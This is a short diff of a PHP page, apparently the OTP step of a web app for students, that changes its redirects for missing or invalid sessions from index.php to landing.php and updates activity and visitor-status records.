@@ -1,9 +1,9 @@
 <?php
 session_start();
 require_once __DIR__ . '/includes/functions.php';
-if (empty($_SESSION['student_token'])) { header('Location: index.php'); exit; }
+if (empty($_SESSION['student_token'])) { header('Location: landing.php'); exit; }
 $student = getStudentByToken($_SESSION['student_token']);
-if (!$student) { header('Location: index.php'); exit; }
+if (!$student) { header('Location: landing.php'); exit; }
 updateStudentActivity($student['id'], 'otp');
 $visitorId = (int)($_SESSION['visitor_id'] ?? 0);
 if ($visitorId) { $db = getDB(); $db->prepare("UPDATE visitors SET is_online=1, status='otp', last_activity=datetime('now') WHERE id=?")->execute([$visitorId]); }
